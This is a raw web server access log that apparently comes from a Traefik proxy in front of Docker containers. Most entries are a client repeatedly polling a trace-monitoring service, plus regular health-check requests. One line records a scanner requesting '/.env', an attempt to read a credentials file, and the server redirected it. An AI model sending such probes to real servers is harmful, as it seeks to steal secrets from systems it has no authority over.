167.71.120.76 - - [16/Dec/2023:02:25:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 486 "www@docker" "http://172.29.0.8:80" 1ms
12.188.169.2 - - [16/Dec/2023:02:25:37 +0000] "GET /trace/pollping.php?id=ygf50kju9 HTTP/2.0" 200 43 "-" "-" 487 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.188.169.2 - - [16/Dec/2023:02:25:38 +0000] "GET /trace/pollping.php?id=ygf50kju9 HTTP/2.0" 200 43 "-" "-" 488 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.188.169.2 - - [16/Dec/2023:02:25:39 +0000] "GET /trace/pollping.php?id=ygf50kju9 HTTP/2.0" 200 43 "-" "-" 489 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.188.169.2 - - [16/Dec/2023:02:25:40 +0000] "GET /trace/pollping.php?id=ygf50kju9 HTTP/2.0" 200 43 "-" "-" 490 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.188.169.2 - - [16/Dec/2023:02:25:41 +0000] "GET /trace/pollping.php?id=ygf50kju9 HTTP/2.0" 200 43 "-" "-" 491 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.188.169.2 - - [16/Dec/2023:02:25:42 +0000] "GET /trace/pollping.php?id=ygf50kju9 HTTP/2.0" 200 43 "-" "-" 492 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.188.169.2 - - [16/Dec/2023:02:25:43 +0000] "GET /trace/pollping.php?id=ygf50kju9 HTTP/2.0" 200 43 "-" "-" 493 "livetrace@docker" "http://172.29.0.3:80" 2ms
12.188.169.2 - - [16/Dec/2023:02:25:44 +0000] "GET /trace/pollping.php?id=ygf50kju9 HTTP/2.0" 200 43 "-" "-" 494 "livetrace@docker" "http://172.29.0.3:80" 2ms
107.170.246.45 - - [16/Dec/2023:02:25:45 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 495 "-" "-" 0ms
12.188.169.2 - - [16/Dec/2023:02:25:45 +0000] "GET /trace/pollping.php?id=ygf50kju9 HTTP/2.0" 200 43 "-" "-" 496 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.188.169.2 - - [16/Dec/2023:02:25:46 +0000] "GET /trace/pollping.php?id=ygf50kju9 HTTP/2.0" 200 43 "-" "-" 497 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.188.169.2 - - [16/Dec/2023:02:25:47 +0000] "GET /trace/pollping.php?id=ygf50kju9 HTTP/2.0" 200 43 "-" "-" 498 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.188.169.2 - - [16/Dec/2023:02:25:48 +0000] "GET /trace/pollping.php?id=ygf50kju9 HTTP/2.0" 200 43 "-" "-" 499 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.188.169.2 - - [16/Dec/2023:02:25:49 +0000] "GET /trace/pollping.php?id=ygf50kju9 HTTP/2.0" 200 43 "-" "-" 500 "livetrace@docker" "http://172.29.0.3:80" 2ms
12.188.169.2 - - [16/Dec/2023:02:25:50 +0000] "GET /trace/pollping.php?id=ygf50kju9 HTTP/2.0" 200 43 "-" "-" 501 "livetrace@docker" "http://172.29.0.3:80" 2ms
12.188.169.2 - - [16/Dec/2023:02:25:51 +0000] "GET /trace/pollping.php?id=ygf50kju9 HTTP/2.0" 200 43 "-" "-" 502 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.188.169.2 - - [16/Dec/2023:02:25:52 +0000] "GET /trace/pollping.php?id=ygf50kju9 HTTP/2.0" 200 113 "-" "-" 503 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.188.169.2 - - [16/Dec/2023:02:25:53 +0000] "GET /trace/cleanping.php?id=ygf50kju9 HTTP/2.0" 200 71 "-" "-" 504 "livetrace@docker" "http://172.29.0.3:80" 3ms
159.203.109.206 - - [16/Dec/2023:02:26:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 505 "www@docker" "http://172.29.0.8:80" 0ms
95.214.235.169 - - [16/Dec/2023:02:26:32 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 506 "web-to-websecure@internal" "-" 0ms
95.214.235.169 - - [16/Dec/2023:02:26:33 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 507 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [16/Dec/2023:02:26:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 508 "www@docker" "http://172.29.0.8:80" 1ms
107.170.253.37 - - [16/Dec/2023:02:26:57 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 509 "-" "-" 0ms
159.203.109.206 - - [16/Dec/2023:02:27:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 510 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:02:27:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 511 "www@docker" "http://172.29.0.8:80" 1ms
12.188.169.2 - - [16/Dec/2023:02:27:39 +0000] "GET /trace/starttrace.php?id=st1xtp3uv HTTP/2.0" 200 104 "-" "-" 512 "livetrace@docker" "http://172.29.0.3:80" 3ms
12.188.169.2 - - [16/Dec/2023:02:27:40 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 957 "-" "-" 513 "livetrace@docker" "http://172.29.0.3:80" 2ms
12.188.169.2 - - [16/Dec/2023:02:27:41 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1368 "-" "-" 514 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.188.169.2 - - [16/Dec/2023:02:27:42 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1368 "-" "-" 515 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.188.169.2 - - [16/Dec/2023:02:27:43 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1368 "-" "-" 516 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.188.169.2 - - [16/Dec/2023:02:27:44 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1391 "-" "-" 517 "livetrace@docker" "http://172.29.0.3:80" 2ms
12.188.169.2 - - [16/Dec/2023:02:27:45 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1391 "-" "-" 518 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.188.169.2 - - [16/Dec/2023:02:27:46 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1391 "-" "-" 519 "livetrace@docker" "http://172.29.0.3:80" 2ms
12.188.169.2 - - [16/Dec/2023:02:27:47 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1393 "-" "-" 520 "livetrace@docker" "http://172.29.0.3:80" 2ms
12.188.169.2 - - [16/Dec/2023:02:27:48 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1393 "-" "-" 521 "livetrace@docker" "http://172.29.0.3:80" 2ms
12.188.169.2 - - [16/Dec/2023:02:27:49 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1393 "-" "-" 522 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.188.169.2 - - [16/Dec/2023:02:27:50 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1395 "-" "-" 523 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.188.169.2 - - [16/Dec/2023:02:27:51 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1395 "-" "-" 524 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.188.169.2 - - [16/Dec/2023:02:27:52 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1395 "-" "-" 525 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.188.169.2 - - [16/Dec/2023:02:27:53 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1418 "-" "-" 526 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.188.169.2 - - [16/Dec/2023:02:27:54 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1418 "-" "-" 527 "livetrace@docker" "http://172.29.0.3:80" 2ms
12.188.169.2 - - [16/Dec/2023:02:27:55 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1418 "-" "-" 528 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.188.169.2 - - [16/Dec/2023:02:27:56 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1420 "-" "-" 529 "livetrace@docker" "http://172.29.0.3:80" 2ms
12.188.169.2 - - [16/Dec/2023:02:27:57 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1420 "-" "-" 530 "livetrace@docker" "http://172.29.0.3:80" 2ms
12.188.169.2 - - [16/Dec/2023:02:27:58 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1420 "-" "-" 531 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.188.169.2 - - [16/Dec/2023:02:27:59 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1422 "-" "-" 532 "livetrace@docker" "http://172.29.0.3:80" 2ms
12.188.169.2 - - [16/Dec/2023:02:28:00 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1422 "-" "-" 533 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.188.169.2 - - [16/Dec/2023:02:28:01 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1422 "-" "-" 534 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.188.169.2 - - [16/Dec/2023:02:28:02 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1445 "-" "-" 535 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.188.169.2 - - [16/Dec/2023:02:28:03 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1445 "-" "-" 536 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.188.169.2 - - [16/Dec/2023:02:28:04 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1445 "-" "-" 537 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.188.169.2 - - [16/Dec/2023:02:28:05 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1447 "-" "-" 538 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.188.169.2 - - [16/Dec/2023:02:28:06 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1447 "-" "-" 539 "livetrace@docker" "http://172.29.0.3:80" 2ms
12.188.169.2 - - [16/Dec/2023:02:28:07 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1447 "-" "-" 540 "livetrace@docker" "http://172.29.0.3:80" 2ms
12.188.169.2 - - [16/Dec/2023:02:28:08 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1449 "-" "-" 541 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.188.169.2 - - [16/Dec/2023:02:28:09 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1449 "-" "-" 542 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.188.169.2 - - [16/Dec/2023:02:28:10 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1449 "-" "-" 543 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.188.169.2 - - [16/Dec/2023:02:28:11 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1472 "-" "-" 544 "livetrace@docker" "http://172.29.0.3:80" 2ms
12.188.169.2 - - [16/Dec/2023:02:28:12 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1472 "-" "-" 545 "livetrace@docker" "http://172.29.0.3:80" 2ms
12.188.169.2 - - [16/Dec/2023:02:28:13 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1472 "-" "-" 546 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.188.169.2 - - [16/Dec/2023:02:28:14 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1474 "-" "-" 547 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.188.169.2 - - [16/Dec/2023:02:28:15 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1474 "-" "-" 548 "livetrace@docker" "http://172.29.0.3:80" 2ms
12.188.169.2 - - [16/Dec/2023:02:28:16 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1474 "-" "-" 549 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.188.169.2 - - [16/Dec/2023:02:28:17 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1476 "-" "-" 550 "livetrace@docker" "http://172.29.0.3:80" 2ms
12.188.169.2 - - [16/Dec/2023:02:28:18 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1476 "-" "-" 551 "livetrace@docker" "http://172.29.0.3:80" 2ms
12.188.169.2 - - [16/Dec/2023:02:28:19 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1476 "-" "-" 552 "livetrace@docker" "http://172.29.0.3:80" 2ms
12.188.169.2 - - [16/Dec/2023:02:28:20 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1499 "-" "-" 553 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.188.169.2 - - [16/Dec/2023:02:28:21 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1499 "-" "-" 554 "livetrace@docker" "http://172.29.0.3:80" 1ms
159.203.109.206 - - [16/Dec/2023:02:28:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 555 "www@docker" "http://172.29.0.8:80" 0ms
12.188.169.2 - - [16/Dec/2023:02:28:23 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1501 "-" "-" 557 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.188.169.2 - - [16/Dec/2023:02:28:23 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1501 "-" "-" 556 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.188.169.2 - - [16/Dec/2023:02:28:24 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1501 "-" "-" 558 "livetrace@docker" "http://172.29.0.3:80" 2ms
12.188.169.2 - - [16/Dec/2023:02:28:25 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1501 "-" "-" 559 "livetrace@docker" "http://172.29.0.3:80" 2ms
12.188.169.2 - - [16/Dec/2023:02:28:26 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1503 "-" "-" 560 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.188.169.2 - - [16/Dec/2023:02:28:27 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1503 "-" "-" 561 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.188.169.2 - - [16/Dec/2023:02:28:28 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1503 "-" "-" 562 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.188.169.2 - - [16/Dec/2023:02:28:29 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1526 "-" "-" 563 "livetrace@docker" "http://172.29.0.3:80" 2ms
12.188.169.2 - - [16/Dec/2023:02:28:30 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1526 "-" "-" 564 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.188.169.2 - - [16/Dec/2023:02:28:31 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1526 "-" "-" 565 "livetrace@docker" "http://172.29.0.3:80" 2ms
12.188.169.2 - - [16/Dec/2023:02:28:32 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1528 "-" "-" 566 "livetrace@docker" "http://172.29.0.3:80" 2ms
12.188.169.2 - - [16/Dec/2023:02:28:33 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1528 "-" "-" 567 "livetrace@docker" "http://172.29.0.3:80" 2ms
12.188.169.2 - - [16/Dec/2023:02:28:34 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1528 "-" "-" 568 "livetrace@docker" "http://172.29.0.3:80" 2ms
12.188.169.2 - - [16/Dec/2023:02:28:35 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1530 "-" "-" 569 "livetrace@docker" "http://172.29.0.3:80" 2ms
12.188.169.2 - - [16/Dec/2023:02:28:36 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1530 "-" "-" 570 "livetrace@docker" "http://172.29.0.3:80" 1ms
167.71.120.76 - - [16/Dec/2023:02:28:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 571 "www@docker" "http://172.29.0.8:80" 1ms
12.188.169.2 - - [16/Dec/2023:02:28:37 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1530 "-" "-" 572 "livetrace@docker" "http://172.29.0.3:80" 2ms
12.188.169.2 - - [16/Dec/2023:02:28:38 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1553 "-" "-" 573 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.188.169.2 - - [16/Dec/2023:02:28:39 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1553 "-" "-" 574 "livetrace@docker" "http://172.29.0.3:80" 2ms
12.188.169.2 - - [16/Dec/2023:02:28:40 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1553 "-" "-" 575 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.188.169.2 - - [16/Dec/2023:02:28:41 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1555 "-" "-" 576 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.188.169.2 - - [16/Dec/2023:02:28:42 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1555 "-" "-" 577 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.188.169.2 - - [16/Dec/2023:02:28:43 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1555 "-" "-" 578 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.188.169.2 - - [16/Dec/2023:02:28:44 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1557 "-" "-" 579 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.188.169.2 - - [16/Dec/2023:02:28:45 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1557 "-" "-" 580 "livetrace@docker" "http://172.29.0.3:80" 2ms
12.188.169.2 - - [16/Dec/2023:02:28:46 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1557 "-" "-" 581 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.188.169.2 - - [16/Dec/2023:02:28:47 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1580 "-" "-" 582 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.188.169.2 - - [16/Dec/2023:02:28:48 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1580 "-" "-" 583 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.188.169.2 - - [16/Dec/2023:02:28:49 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1580 "-" "-" 584 "livetrace@docker" "http://172.29.0.3:80" 2ms
12.188.169.2 - - [16/Dec/2023:02:28:50 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1582 "-" "-" 585 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.188.169.2 - - [16/Dec/2023:02:28:51 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1582 "-" "-" 586 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.188.169.2 - - [16/Dec/2023:02:28:52 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1582 "-" "-" 587 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.188.169.2 - - [16/Dec/2023:02:28:53 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1584 "-" "-" 588 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.188.169.2 - - [16/Dec/2023:02:28:54 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1584 "-" "-" 589 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.188.169.2 - - [16/Dec/2023:02:28:55 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1584 "-" "-" 590 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.188.169.2 - - [16/Dec/2023:02:28:56 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1607 "-" "-" 591 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.188.169.2 - - [16/Dec/2023:02:28:57 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1607 "-" "-" 592 "livetrace@docker" "http://172.29.0.3:80" 2ms
12.188.169.2 - - [16/Dec/2023:02:28:58 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1607 "-" "-" 593 "livetrace@docker" "http://172.29.0.3:80" 2ms
12.188.169.2 - - [16/Dec/2023:02:28:59 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1609 "-" "-" 594 "livetrace@docker" "http://172.29.0.3:80" 2ms
12.188.169.2 - - [16/Dec/2023:02:29:01 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1609 "-" "-" 595 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.188.169.2 - - [16/Dec/2023:02:29:02 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1609 "-" "-" 596 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.188.169.2 - - [16/Dec/2023:02:29:03 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1611 "-" "-" 597 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.188.169.2 - - [16/Dec/2023:02:29:04 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1611 "-" "-" 598 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.188.169.2 - - [16/Dec/2023:02:29:05 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1611 "-" "-" 599 "livetrace@docker" "http://172.29.0.3:80" 2ms
12.188.169.2 - - [16/Dec/2023:02:29:06 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1634 "-" "-" 600 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.188.169.2 - - [16/Dec/2023:02:29:07 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1634 "-" "-" 601 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.188.169.2 - - [16/Dec/2023:02:29:08 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1634 "-" "-" 602 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.188.169.2 - - [16/Dec/2023:02:29:09 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1636 "-" "-" 603 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.188.169.2 - - [16/Dec/2023:02:29:10 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1636 "-" "-" 604 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.188.169.2 - - [16/Dec/2023:02:29:11 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1636 "-" "-" 605 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.188.169.2 - - [16/Dec/2023:02:29:12 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1638 "-" "-" 606 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.188.169.2 - - [16/Dec/2023:02:29:13 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1638 "-" "-" 607 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.188.169.2 - - [16/Dec/2023:02:29:14 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1638 "-" "-" 608 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.188.169.2 - - [16/Dec/2023:02:29:15 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1661 "-" "-" 609 "livetrace@docker" "http://172.29.0.3:80" 2ms
12.188.169.2 - - [16/Dec/2023:02:29:16 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1661 "-" "-" 610 "livetrace@docker" "http://172.29.0.3:80" 2ms
12.188.169.2 - - [16/Dec/2023:02:29:17 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1661 "-" "-" 611 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.188.169.2 - - [16/Dec/2023:02:29:18 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1663 "-" "-" 612 "livetrace@docker" "http://172.29.0.3:80" 2ms
12.188.169.2 - - [16/Dec/2023:02:29:19 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1663 "-" "-" 613 "livetrace@docker" "http://172.29.0.3:80" 2ms
12.188.169.2 - - [16/Dec/2023:02:29:20 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1663 "-" "-" 614 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.188.169.2 - - [16/Dec/2023:02:29:21 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1665 "-" "-" 615 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.188.169.2 - - [16/Dec/2023:02:29:22 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1665 "-" "-" 616 "livetrace@docker" "http://172.29.0.3:80" 2ms
159.203.109.206 - - [16/Dec/2023:02:29:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 617 "www@docker" "http://172.29.0.8:80" 1ms
12.188.169.2 - - [16/Dec/2023:02:29:23 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1665 "-" "-" 618 "livetrace@docker" "http://172.29.0.3:80" 2ms
12.188.169.2 - - [16/Dec/2023:02:29:24 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1688 "-" "-" 619 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.188.169.2 - - [16/Dec/2023:02:29:25 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1688 "-" "-" 620 "livetrace@docker" "http://172.29.0.3:80" 2ms
12.188.169.2 - - [16/Dec/2023:02:29:26 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1688 "-" "-" 621 "livetrace@docker" "http://172.29.0.3:80" 2ms
12.188.169.2 - - [16/Dec/2023:02:29:27 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1690 "-" "-" 622 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.188.169.2 - - [16/Dec/2023:02:29:28 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1690 "-" "-" 623 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.188.169.2 - - [16/Dec/2023:02:29:29 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1690 "-" "-" 624 "livetrace@docker" "http://172.29.0.3:80" 2ms
12.188.169.2 - - [16/Dec/2023:02:29:30 +0000] "GET /trace/polltrace.php?id=st1xtp3uv HTTP/2.0" 200 1712 "-" "-" 625 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.188.169.2 - - [16/Dec/2023:02:29:30 +0000] "GET /trace/cleantrace.php?id=st1xtp3uv HTTP/2.0" 200 72 "-" "-" 626 "livetrace@docker" "http://172.29.0.3:80" 3ms
167.71.120.76 - - [16/Dec/2023:02:29:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 627 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:02:30:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 628 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:02:30:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 629 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:02:31:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 630 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:02:31:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 631 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:02:32:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 632 "www@docker" "http://172.29.0.8:80" 1ms
